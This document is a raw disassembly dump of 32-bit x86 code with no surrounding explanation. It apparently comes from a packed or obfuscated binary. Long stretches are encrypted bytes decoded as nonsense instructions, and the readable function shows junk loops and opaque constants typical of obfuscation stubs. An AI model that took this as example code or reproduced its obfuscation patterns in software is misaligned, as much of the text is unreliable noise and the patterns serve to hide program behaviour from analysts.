  4030d1:	push   ss
  4030d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030d3:	lods   al,BYTE PTR ds:[esi]
  4030d4:	out    dx,eax
  4030d5:	add    esp,ebx
  4030d7:	inc    esp
  4030d8:	ja     0x4030db
  4030da:	cwde   
  4030db:	shl    DWORD PTR [ebp+0x4fc5d49],0xcc
  4030e2:	stos   DWORD PTR es:[edi],eax
  4030e3:	add    edi,esp
  4030e5:	pushf  
  4030e6:	pop    ecx
  4030e7:	adc    esp,esp
  4030e9:	psrad  mm3,QWORD PTR [esi+0x73]
  4030ed:	test   BYTE PTR [ebx+ebp*1+0x24c052be],bh
  4030f4:	pop    ebx
  4030f5:	js     0x403174
  4030f7:	mov    edx,0xab8b5206
  4030fc:	cmc    
  4030fd:	push   ebp
  4030fe:	int    0x39
  403100:	cmp    esi,edx
  403102:	ror    BYTE PTR [ecx-0x1db91fe5],1
  403108:	loop   0x40313e
  40310a:	pop    ss
  40310b:	cs adc al,0x41
  40310e:	(bad)  
  403110:	imul   ebp,ebp,0x3f9ca60a
  403116:	(bad)
  403119:	xor    eax,eax
  40311b:	mov    ebp,0xa0d798ca
  403120:	push   ss
  403121:	and    eax,DWORD PTR [edx]
  403123:	xchg   edx,eax
  403124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403125:	daa    
  403126:	jg     0x403112
  403128:	dec    ebx
  403129:	ret    0xcbd7
  40312c:	add    eax,0xb8cb5167
  403131:	xchg   BYTE PTR [esi+eax*8-0x7b4bab80],al
  403138:	repnz xlat BYTE PTR ds:[ebx]
  40313a:	fiadd  DWORD PTR [ecx-0x1]
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shr    edx,0xcf
  40315e:	stos   BYTE PTR es:[edi],al
  40315f:	cmp    BYTE PTR [edx-0x58181e9],0x7f
  403166:	jle    0x4031e6
  403168:	jecxz  0x4031c2
  40316a:	add    esp,DWORD PTR [edi+ecx*1+0x669151d]
  403171:	das    
  403172:	ss (bad) 
  403174:	mov    esp,0x30b3bcd7
  403179:	xor    eax,0x705901c4
  40317e:	rcr    BYTE PTR ds:0x8b485051,1
  403184:	(bad)  
  403185:	mov    eax,0x60d526f7
  40318a:	inc    edi
  40318b:	jbe    0x4031fc
  40318d:	xchg   ebx,eax
  40318e:	adc    cl,cl
  403190:	retf   0x3cb2
  403193:	mov    ecx,0xbbcc89bd
  403198:	xor    DWORD PTR [edi-0x44],esi
  40319b:	in     eax,0x8d
  40319d:	call   0xc3a7:0x4a73c584
  4031a4:	jecxz  0x403175
  4031a6:	out    0x90,al
  4031a8:	push   esi
  4031a9:	rcr    BYTE PTR [ebx+0x34],1
  4031ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031ad:	jmp    DWORD PTR [esi-0xf]
  4031b0:	push   eax
  4031b1:	ret    
  4031b2:	out    dx,al
  4031b3:	mov    DWORD PTR [edi+eiz*1-0x6efefd10],ecx
  4031ba:	adc    BYTE PTR [eax+0x70cd0849],dl
  4031c0:	xchg   BYTE PTR [esi+ebx*4+0x7832fcf1],cl
  4031c7:	call   0x73f950a8
  4031cc:	and    al,dh
  4031ce:	xchg   ebp,eax
  4031cf:	pop    es
  4031d0:	pop    esp
  4031d1:	or     DWORD PTR [esi+0x22],edx
  4031d4:	jecxz  0x40320e
  4031d6:	mov    edi,0x1e1e5a0d
  4031db:	sbb    al,0x23
  4031dd:	pop    ebp
  4031de:	cmp    ah,dh
  4031e0:	cli    
  4031e1:	in     eax,dx
  4031e2:	das    
  4031e3:	aaa    
  4031e4:	inc    ebx
  4031e5:	loope  0x4031e7
  4031e7:	pop    ds
  4031e8:	outs   dx,DWORD PTR ds:[esi]
  4031e9:	add    DWORD PTR [eax],0xd537eeff
  4031ef:	push   es
  4031f0:	push   ss
  4031f1:	fsubr  st(0),st
  4031f3:	shl    BYTE PTR [ebx+0x42ed5e74],1
  4031f9:	popf   
  4031fa:	int3   
  4031fb:	xchg   esi,eax
  4031fc:	cmc    
  4031fd:	cs aas 
  4031ff:	fld    QWORD PTR [edi+0x4f0761e]
  403205:	add    BYTE PTR [edi+0x2ca3055c],dl
  40320b:	jecxz  0x403282
  40320d:	inc    ebx
  40320e:	cmp    al,0x78
  403210:	and    al,0x6e
  403212:	cmp    eax,0x4e9e538c
  403217:	stos   BYTE PTR es:[edi],al
  403218:	call   0x5886a4b1
  40321d:	sbb    DWORD PTR [ecx-0x71ac9a68],0xb4adf4b4
  403227:	pop    ecx
  403228:	dec    bh
  40322a:	out    dx,eax
  40322b:	push   ss
  40322c:	pop    edi
  40322d:	mov    WORD PTR [esi+0x7c018f60],fs
  403233:	mov    esi,0xc4ed60d1
  403238:	(bad)  
  403239:	(bad)  [esi-0x579967bc]
  40323f:	or     ecx,DWORD PTR [edx+0x4f]
  403242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403243:	cmp    al,0x2e
  403245:	jae    0x4032a1
  403247:	retf   0xe4c2
  40324a:	leave  
  40324b:	or     DWORD PTR [edx],ecx
  40324d:	cmp    DWORD PTR [edx-0x49],ecx
  403250:	xor    BYTE PTR ds:0x6feefaf7,ah
  403256:	mov    ch,0xbe
  403258:	inc    edx
  403259:	or     bh,ah
  40325b:	dec    ebp
  40325c:	xchg   ebp,eax
  40325d:	les    esp,FWORD PTR [ebx+edi*2-0x3a]
  403261:	mov    edi,0xf915eed3
  403266:	pop    edx
  403267:	std    
  403268:	inc    ecx
  403269:	push   es
  40326a:	mov    ebx,0x7e1e52d9
  40326f:	jmp    0x403289
  403271:	mov    eax,0x906db2e0
  403276:	in     eax,0x4c
  403278:	clc    
  403279:	pusha  
  40327a:	lods   al,BYTE PTR ds:[esi]
  40327b:	retf   0x2517
  40327e:	out    0x49,al
  403280:	jge    0x403280
  403282:	rcl    DWORD PTR [eax-0x7f5e24bc],cl
  403288:	out    dx,al
  403289:	sbb    DWORD PTR [ecx-0x7e951741],ebp
  40328f:	test   al,0x7e
  403291:	ss xor al,0xe3
  403294:	fdivr  DWORD PTR [esi]
  403296:	fisttp WORD PTR [eax]
  403298:	in     eax,dx
  403299:	mov    dl,0xac
  40329b:	int    0xc5
  40329d:	loop   0x403294
  40329f:	jmp    0xeee87944
  4032a4:	nop
  4032a5:	add    al,0x4e
  4032a7:	dec    ebx
  4032a8:	enter  0x801b,0x26
  4032ac:	add    eax,0x4a25a21f
  4032b1:	push   esp
  4032b2:	repnz repnz dec ecx
  4032b5:	pop    edi
  4032b6:	xchg   BYTE PTR [eax-0x66360ca1],dh
  4032bc:	sahf   
  4032bd:	cmp    BYTE PTR [bx+si+0x1f],cl
  4032c1:	scas   al,BYTE PTR es:[edi]
  4032c2:	cdq    
  4032c3:	push   0x7a2c2043
  4032c8:	pop    esp
  4032c9:	nop
  4032ca:	jae    0x4032d8
  4032cc:	mov    esi,0xa1de4086
  4032d1:	mov    DWORD PTR [edx-0x7],ecx
  4032d4:	xor    ecx,0x6e5389f3
  4032da:	cmp    al,0xe4
  4032dc:	cwde   
  4032dd:	ror    DWORD PTR [esi+0x71],0xfd
  4032e1:	jne    0x40335f
  4032e3:	mov    ah,0x97
  4032e5:	sbb    DWORD PTR [ecx+0x36],ebp
  4032e8:	fidiv  DWORD PTR [esi]
  4032ea:	dec    edi
  4032eb:	mov    ds,WORD PTR [esi+0x5b]
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x20a1d48a]
  403537:	inc    eax
  403538:	sub    al,0xc6
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	and    eax,0x1f65e0fd
  403546:	and    edi,DWORD PTR [ebx]
  403548:	in     eax,0x58
  40354a:	or     cl,BYTE PTR [eax+0x35]
  40354d:	mov    al,0x49
  40354f:	loop   0x4035ab
  403551:	daa    
  403552:	jns    0x4035cc
  403554:	jo     0x403593
  403556:	and    DWORD PTR [eax+ecx*2],eax
  403559:	mov    esp,0xca7ff7bf
  40355e:	jno    0x4035af
  403560:	fld    st(6)
  403562:	add    edi,DWORD PTR [ecx]
  403564:	clc    
  403565:	ud0    esp,DWORD PTR [ecx-0x2d]
  403569:	retf   
  40356a:	jle    0x4034f2
  40356c:	outs   dx,BYTE PTR ds:[esi]
  40356d:	inc    esi
  40356e:	xchg   edi,eax
  40356f:	dec    esi
  403570:	fdivr  st(0),st
  403572:	jl     0x4035c2
  403574:	retf   
  403575:	ds in  eax,0x7a
  403578:	pop    edx
  403579:	aas    
  40357a:	add    esi,DWORD PTR [edx]
  40357c:	pushf  
  40357d:	mov    ah,0xd5
  40357f:	sbb    eax,0x48d39d76
  403584:	adc    DWORD PTR [eax],esp
  403586:	dec    edx
  403587:	icebp  
  403588:	lds    eax,FWORD PTR [esi+0x63c6919a]
  40358e:	xchg   esp,eax
  40358f:	arpl   di,bx
  403591:	or     esp,DWORD PTR [ebx+ebp*8-0x20b71b8e]
  403598:	adc    edi,DWORD PTR [edx]
  40359a:	test   al,0x5
  40359c:	sti    
  40359d:	dec    esp
  40359e:	mov    DWORD PTR [edi],ebp
  4035a0:	ja     0x4035ae
  4035a2:	inc    ecx
  4035a3:	lods   eax,DWORD PTR ds:[esi]
  4035a4:	sahf   
  4035a5:	mov    cl,0x8c
  4035a7:	push   0x58385b07
  4035ac:	mov    edx,0x7aa117c
  4035b1:	ror    DWORD PTR [esi+ebp*8-0x43],cl
  4035b5:	iret   
  4035b6:	mov    eax,ds:0x8ebe79f1
  4035bb:	lods   eax,DWORD PTR ds:[esi]
  4035bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035bd:	ror    BYTE PTR [ebp+edi*8-0x5c0fd97c],1
  4035c4:	shl    dl,0x14
  4035c7:	jl     0x40355d
  4035c9:	(bad)  
  4035ca:	shl    BYTE PTR [ecx-0x444fd18e],0x9e
  4035d1:	or     DWORD PTR [edi*2+0x6b8b55bd],0x12d5be01
  4035dc:	test   eax,0x1086f42a
  4035e1:	jmp    0x4035f8
  4035e3:	loop   0x4035a4
  4035e5:	inc    ecx
  4035e6:	jge    0x4035e7
  4035e8:	sbb    al,0xf0
  4035ea:	cld    
  4035eb:	fistp  QWORD PTR [ebx+0x160eb997]
  4035f1:	mov    ebp,0x2c5320af
  4035f6:	inc    BYTE PTR [edi-0xae427d9]
  4035fc:	xchg   edx,eax
  4035fd:	je     0x403659
  4035ff:	mov    dh,0xe6
  403601:	cmp    cl,BYTE PTR [edi+0x22]
  403604:	mov    ebp,0x34e0edca
  403609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40360a:	pop    eax
  40360b:	ins    DWORD PTR es:[edi],dx
  40360c:	das    
  40360d:	daa    
  40360e:	mov    bl,0x95
  403610:	add    BYTE PTR [edi-0x41],cl
  403613:	adc    BYTE PTR [ebx-0x21c9f410],cl
  403619:	add    BYTE PTR [edx],dl
  40361b:	jmp    0x403620
  40361d:	fwait
  40361e:	pop    eax
  40361f:	pop    esp
  403620:	cmp    eax,0xc55090ba
  403625:	mov    ah,0xf3
  403627:	and    al,0xfc
  40362a:	lods   eax,DWORD PTR ds:[esi]
  40362b:	xchg   edi,eax
  40362c:	pusha  
  40362d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40362e:	xchg   bh,bl
  403630:	sub    DWORD PTR [esi-0x235e9c19],esp
  403636:	aad    0x9c
  403638:	jbe    0x403663
  40363a:	pop    esp
  40363b:	sahf   
  40363c:	ficomp DWORD PTR [bp+si-0x7b]
  403640:	fmul   QWORD PTR [esp+ecx*4+0x56f6fd26]
  403647:	lods   al,BYTE PTR ds:[esi]
  403648:	mov    al,ds:0xfa75947b
  40364d:	enter  0x86f9,0x2
  403651:	in     eax,0x2e
  403653:	ret    0x4475
  403656:	and    ch,0x73
  403659:	xor    al,0x9b
  40365b:	mov    dl,0xa2
  40365d:	pop    es
  40365e:	call   0xbabb:0xff1c664e
  403665:	mov    eax,0xe17c0609
  40366a:	jl     0x40369b
  40366c:	out    0x3e,eax
  40366e:	loopne 0x4036be
  403670:	test   eax,0xb99fe92d
  403675:	je     0x4036bf
  403677:	jns    0x4036f1
  403679:	and    DWORD PTR [ebx+0x7e],edi
  40367c:	sbb    bh,bl
  40367e:	mov    DWORD PTR [ecx+edx*4],eax
  403681:	jge    0x4036d6
  403683:	push   es
  403684:	jnp    0x403693
  403686:	jl     0x403648
  403688:	mov    edx,0x74c154f1
  40368d:	and    dh,ch
  40368f:	pop    ebp
  403690:	dec    ebp
  403691:	mov    bl,0xb3
  403693:	add    DWORD PTR [eax+0x15da77c6],ebx
  403699:	je     0x4036a9
  40369b:	pop    esi
  40369c:	iret   
  40369d:	call   0xc7b4:0xa71edeae
  4036a4:	bound  esp,QWORD PTR [ebx+0x1f73439d]
  4036aa:	stc    
  4036ab:	in     eax,0xee
  4036ad:	loope  0x40362f
  4036af:	lods   eax,DWORD PTR ds:[esi]
  4036b0:	pop    ebx
  4036b1:	xchg   ebp,eax
  4036b2:	ins    BYTE PTR es:[edi],dx
  4036b3:	inc    ecx
  4036b4:	cmp    ebp,esi
  4036b6:	pop    ebx
  4036b7:	dec    esp
  4036b8:	pop    ss
  4036b9:	jno    0x40367d
  4036bb:	mov    ebx,0xd689689
  4036c0:	loope  0x40366d
  4036c2:	dec    DWORD PTR [edi-0x7f]
  4036c5:	fs pop ecx
  4036c7:	pop    esi
  4036c8:	test   BYTE PTR [ecx+0x63],ah
  4036cb:	add    ebp,edx
  4036cd:	dec    edi
  4036ce:	mov    ah,0x14
  4036d0:	nop
  4036d1:	mov    cl,0x9c
  4036d3:	lea    eax,[eax]
  4036d5:	jge    0x403703
  4036d7:	xlat   BYTE PTR ds:[ebx]
  4036d8:	mul    DWORD PTR [ecx-0xfcea81e]
  4036de:	fiadd  DWORD PTR [ecx]
  4036e0:	jmp    0x403742
  4036e2:	bound  ecx,QWORD PTR [ebx+0x6f2cd068]
  4036e8:	jecxz  0x40373c
  4036ea:	pop    eax
  4036eb:	das    
  4036ec:	push   0xffffff97
  4036ee:	mov    dl,0xd5
  4036f0:	mov    esp,ebx
  4036f2:	xchg   esp,eax
  4036f3:	xor    bl,BYTE PTR [edi+0x78]
  4036f6:	ret    
  4036f7:	and    eax,0x9569c8f2
  4036fc:	or     bl,dh
  4036fe:	sbb    al,0xf4
  403700:	adc    al,BYTE PTR ds:0x8264cdfa
  403706:	ret    0x4bf2
  403709:	push   edi
  40370a:	cmp    esp,DWORD PTR [edi]
  40370c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370d:	sti    
  40370e:	adc    eax,esp
  403710:	mov    al,0x40
  403712:	ret    0x259a
  403715:	xchg   ecx,eax
  403716:	aas    
  403717:	adc    eax,0x1b66bce4
  40371c:	mov    eax,ds:0x34195e4c
  403721:	adc    ecx,DWORD PTR ds:0xf0b17b8e
  403727:	xor    edi,ebx
  403729:	or     eax,DWORD PTR [ecx-0x7418011a]
  40372f:	mov    ds:0x824c62e4,al
  403734:	cmp    eax,0x2
  403737:	mov    ebx,0xdabe4e34
  40373c:	inc    esp
  40373d:	ds loope 0x4037bc
  403740:	sbb    ebp,ecx
  403742:	sub    edx,edx
  403744:	push   ebx
  403745:	and    bh,BYTE PTR [ebp-0x61ff081d]
  40374b:	mov    cl,0xd3
  40374d:	jb     0x403727
  40374f:	dec    eax
  403750:	push   esp
  403751:	and    al,0xb4
  403753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403754:	pop    eax
  403755:	adc    eax,0x8c590521
  40375a:	xchg   ecx,eax
  40375b:	adc    ecx,DWORD PTR [ecx+edi*8-0x57708040]
  403762:	aad    0x3e
  403764:	jl     0x4037df
  403766:	out    0x15,eax
  403768:	dec    ebp
  403769:	fist   DWORD PTR [esi-0x68ea4425]
  40376f:	push   cs
  403770:	push   esp
  403771:	xor    BYTE PTR [eax],ah
  403773:	xchg   ecx,eax
  403774:	add    al,0x5e
  403776:	add    BYTE PTR [edx+edx*4+0x12],ch
  40377a:	pcmpgtd mm0,QWORD PTR [ebx]
  40377d:	js     0x40377e
  40377f:	xchg   edi,eax
  403780:	sub    DWORD PTR [edx-0x37],edx
  403783:	test   BYTE PTR [esi],bh
  403785:	adc    BYTE PTR [edi+0x56],al
  403788:	mov    BYTE PTR [esi+0x46],bh
  40378b:	retf   0x1365
  40378e:	mov    ch,0x97
  403790:	fiadd  WORD PTR [eax-0x12bcfdeb]
  403796:	sub    eax,0x7f3109bb
  40379b:	in     eax,0x41
  40379d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40379f:	lahf   
  4037a0:	(bad)
  4037a3:	out    dx,al
  4037a4:	js     0x4037ec
  4037a6:	dec    ecx
  4037a7:	xor    ebx,DWORD PTR [ebx+0x96e945f]
  4037ad:	mov    bh,0x6e
  4037af:	sub    eax,0xd52c2e59
  4037b4:	adc    cl,bl
  4037b6:	dec    esi
  4037b7:	sbb    ebx,DWORD PTR [edx]
  4037b9:	or     al,BYTE PTR [esi+0x8]
  4037bc:	jg     0x40382b
  4037be:	hlt    
  4037bf:	cmp    BYTE PTR [edi+0x32],bh
  4037c2:	cmp    al,0x21
  4037c4:	and    al,0x47
  4037c6:	retf   
  4037c7:	enter  0xc688,0xb7
  4037cb:	adc    cl,BYTE PTR [ebx]
  4037cd:	aad    0x99
  4037cf:	adc    bh,BYTE PTR [ecx]
  4037d1:	loopne 0x4037c5
  4037d3:	div    ebp
  4037d5:	js     0x403823
  4037d7:	fcomi  st,st(3)
  4037d9:	push   esi
  4037da:	mov    ?,WORD PTR [edi+0x13]
  4037dd:	mov    dh,0x88
  4037df:	sub    eax,0x3bae5d6d
  4037e4:	scas   al,BYTE PTR es:[edi]
  4037e5:	out    dx,eax
  4037e6:	add    eax,0x7a7a0941
  4037eb:	mov    al,0x25
  4037ed:	mov    al,ds:0xc94e060
  4037f2:	and    ecx,DWORD PTR [edi+eax*1+0x23]
  4037f6:	lods   eax,DWORD PTR ds:[esi]
  4037f7:	xchg   ecx,eax
  4037f8:	in     al,0x83
  4037fa:	(bad)  
  4037fc:	pop    edx
  4037fd:	jbe    0x8e30ff13
  403803:	in     eax,0x21
  403805:	xchg   esi,eax
  403806:	pop    ds
  403807:	jmp    0xa343c316
  40380c:	mov    esi,0x4cb4777a
  403811:	iret   
  403812:	jle    0x40386f
  403814:	ret    
  403815:	sahf   
  403816:	ja     0x40386a
  403818:	inc    ecx
  403819:	stc    
  40381a:	out    dx,al
  40381b:	adc    al,0x7f
  40381d:	xlat   BYTE PTR ds:[ebx]
  40381e:	xchg   edx,eax
  40381f:	shl    DWORD PTR [edx-0x78708f69],0xb4
  403826:	mov    dh,0xc7
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
